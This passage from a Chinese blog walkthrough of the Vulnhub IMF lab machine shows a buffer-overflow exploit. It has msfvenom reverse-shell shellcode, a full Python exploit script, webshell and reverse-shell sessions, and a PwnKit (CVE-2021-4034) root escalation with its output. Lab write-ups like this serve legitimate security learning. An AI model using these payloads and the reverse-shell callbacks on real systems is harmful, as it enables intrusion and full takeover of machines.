+<p><img src="https://image.3001.net/images/20180710/1531208091689.png!small" srcset="/img/loading.gif" lazyload alt="A.png"></p>
+<p>再用 <code>/usr/share/metasploit-­‐framework/tools/pattern_offset.rb -q 41366641</code> 反查：</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">[*] <span class="hljs-built_in">Exact</span> <span class="hljs-built_in">match</span> at <span class="hljs-built_in">offset</span> <span class="hljs-number">168</span><br></code></pre></td></tr></table></figure>
+<p>发现程序在第168个字符处溢出，再生成 A*168+B*4+C*1000 的测试字符：</p>
+<p><img src="https://image.3001.net/images/20180710/15312081152906.png!small" srcset="/img/loading.gif" lazyload alt="B.png"></p>
+<p>发现 EAX 变成了一堆 A，看能不能找到 <code>call eax</code> 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 22:37:10nasm &gt; call eax 00000000 FFD0 call eax</span><br></code></pre></td></tr></table></figure>
+<p>edb里搜索 FFD0，找到地址 <code>0x08048563</code> ：</p>
+<p><img src="https://image.3001.net/images/20180710/15312081667844.png!small" srcset="/img/loading.gif" lazyload alt="C.png"></p>
+<p>重启程序发现地址不变，就选这个地址来作为EIP的值。</p>
+<p>生成shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.190.1 LPORT=6666 -f python -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span> &gt; ATK.py</span>       <br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload                         [-] No arch selected, selecting arch: x86 from the payload                                                   Found 10 compatible encoders                                                                                 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai                                         x86/shikata_ga_nai succeeded with size 95 (iteration=0)                                                     x86/shikata_ga_nai chosen with final size 95                                                                 Payload size: 95 bytes                                                                                       Final size of python file: 470 bytes<br></code></pre></td></tr></table></figure>
+<p>编写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;192.168.135.146&quot;</span><br>port = <span class="hljs-number">7788</span><br><br>ret = <span class="hljs-string">&quot;\x63\x85\x04\x08\n&quot;</span><br><br>buf =  <span class="hljs-string">&quot;&quot;</span><br>buf += <span class="hljs-string">&quot;\xbb\xa3\xdc\x2d\x95\xdb\xc2\xd9\x74\x24\xf4\x5f\x33&quot;</span><br>buf += <span class="hljs-string">&quot;\xc9\xb1\x12\x31\x5f\x12\x03\x5f\x12\x83\x64\xd8\xcf&quot;</span><br>buf += <span class="hljs-string">&quot;\x60\x5b\x3a\xf8\x68\xc8\xff\x54\x05\xec\x76\xbb\x69&quot;</span><br>buf += <span class="hljs-string">&quot;\x96\x45\xbc\x19\x0f\xe6\x82\xd0\x2f\x4f\x84\x13\x47&quot;</span><br>buf += <span class="hljs-string">&quot;\x90\xde\x5a\x96\x78\x1d\xa3\x82\x72\xa8\x42\x02\xe4&quot;</span><br>buf += <span class="hljs-string">&quot;\xfa\xd5\x31\x5a\xf9\x5c\x54\x51\x7e\x0c\xfe\x04\x50&quot;</span><br>buf += <span class="hljs-string">&quot;\xc2\x96\xb0\x81\x0b\x04\x28\x57\xb0\x9a\xf9\xee\xd6&quot;</span><br>buf += <span class="hljs-string">&quot;\xaa\xf5\x3d\x98&quot;</span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * (<span class="hljs-number">168</span> - <span class="hljs-built_in">len</span>(buf))<br>buf += ret<br><br>con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>con.connect((host, port))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Connected&quot;</span><br><br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br>con.send(<span class="hljs-string">b&quot;48093572\n&quot;</span>)<br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br>con.send(<span class="hljs-string">b&quot;3\n&quot;</span>)<br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Sending evil buffer...&quot;</span><br>con.send(buf)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;done&quot;</span><br></code></pre></td></tr></table></figure>
+<p>打开 nc 监听 6666 端口,然后就得到了 root 权限。</p>
+<p><strong>10、cve-2021-4034：</strong></p>
+<blockquote>
+<p>不同的 shell 运行结果不一致，php-reverse-shell.php 可以成功，weevely 生成的 cd5bb348e612.gif 不可以成功 。</p>
+</blockquote>
+<p><strong>cd5bb348e612.gif：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.146/imfadministrator/uploads/cd5bb348e612.gif <span class="hljs-built_in">test</span></span><br><br>[+] weevely 4.0.1<br><br>[+] Target:     www-data@imf:/var/www/html/imfadministrator/uploads<br>[+] Session:    /home/kali/.weevely/sessions/192.168.135.146/cd5bb348e612_0.session<br>[+] Shell:      System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ls<br>a.out<br>cd5bb348e612.gif<br>cve-2021-4034-poc2.c<br>flag5_abc123def.txt<br>php-reverse-shell.php<br>www-data@imf:/var/www/html/imfadministrator/uploads $ ./a.out<br>Current User before execute exploit<br><span class="hljs-meta">hacker@victim$</span><span class="bash">whoami: www-data</span><br>Exploit written by @luijait (0x6c75696a616974)<br>[+] Enjoy your root if exploit was completed succesfully<br>bash: cannot set terminal process group (1288): Inappropriate ioctl for device<br>bash: no job control in this shell<br>root@imf:/var/www/html/imfadministrator/uploads# exit<br>www-data@imf:/var/www/html/imfadministrator/uploads $ <br><br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ./a.out<br>GLib: Cannot convert message: Could not open converter from &#x27;UTF-8&#x27; to &#x27;PWNKIT&#x27;<br>pkexec must be setuid root<br>www-data@imf:/var/www/html/imfadministrator/uploads $ <br></code></pre></td></tr></table></figure>
+<p><strong>php-reverse-shell.php：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.146] 59416<br>Linux imf 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br> 10:12:02 up 16 min,  0 users,  load average: 0.54, 0.60, 0.46<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /var/www/html/imfadministrator/uploads</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>GCONV_PATH=.<br>a.out<br>cd5bb348e612.gif<br>cve-2021-4034-poc2.c<br>flag5_abc123def.txt<br>php-reverse-shell.php<br>tmp<br><span class="hljs-meta">$</span><span class="bash"> ./a.out</span><br>Current User before execute exploit<br><span class="hljs-meta">hacker@victim$</span><span class="bash">whoami: www-data</span><br>Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory &#x27;GCONV_PATH=.&#x27;: File exists<br>mkdir: cannot create directory &#x27;tmp&#x27;: File exists<br><br>[+] Enjoy your root if exploit was completed succesfully<br>bash: cannot set terminal process group (1288): Inappropriate ioctl for device<br>bash: no job control in this shell<br>root@imf:/var/www/html/imfadministrator/uploads# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/06/MessUp/Typora%E5%BC%80%E5%8F%91%E7%89%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Typora开发版无法使用解决方法</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/01/Penetration/Vulnhub/Part-1/0x02%20W1R3S/">
+                        <span class="hidden-mobile">W1R3S：1.0.1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
